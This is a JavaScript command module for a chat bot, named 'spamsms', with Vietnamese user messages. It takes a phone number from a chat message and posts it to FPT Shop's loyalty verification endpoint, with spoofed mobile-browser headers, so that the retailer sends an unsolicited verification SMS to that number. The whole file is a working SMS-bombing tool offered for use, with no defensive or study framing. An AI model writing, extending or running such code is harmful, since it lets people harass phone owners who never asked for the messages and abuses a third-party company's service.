const axios = require('axios');

module.exports = {
  name: "spamsms",
  usedby: 0,
  info: "gửi thông báo đến số",
  onPrefix: false,
  cooldowns: 10,

  onLaunch: function ({ api, event }) {
    // Extract the phone number from the command
    const args = event.body.trim().split(" ");
    if (args.length < 2) {
      return api.sendMessage("Vui lòng nhập số điện thoại. Ví dụ: spamsms 0123456789", event.threadID, event.messageID);
    }

    const phone = args[1];

    axios.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification",
      new URLSearchParams({ phone: phone }).toString(),
      {
        headers: {
          "Host": "fptshop.com.vn",
          "Content-Length": "16",
          "Accept": "*/*",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Sec-CH-UA-Mobile": "?1",
          "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
          "Sec-CH-UA-Platform": "\"Linux\"",
          "Origin": "https://fptshop.com.vn",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Dest": "empty",
          "Referer": "https://fptshop.com.vn/",
          "Accept-Encoding": "gzip, deflate, br"
        }
      }
    )
    .then(response => {
      api.sendMessage(`Gửi thông báo thành công đến số ${phone}`, event.threadID, event.messageID);
    })
    .catch(error => {
      api.sendMessage(`Gửi thông báo thất bại: ${error.message}`, event.threadID, event.messageID);
    });
  }
};
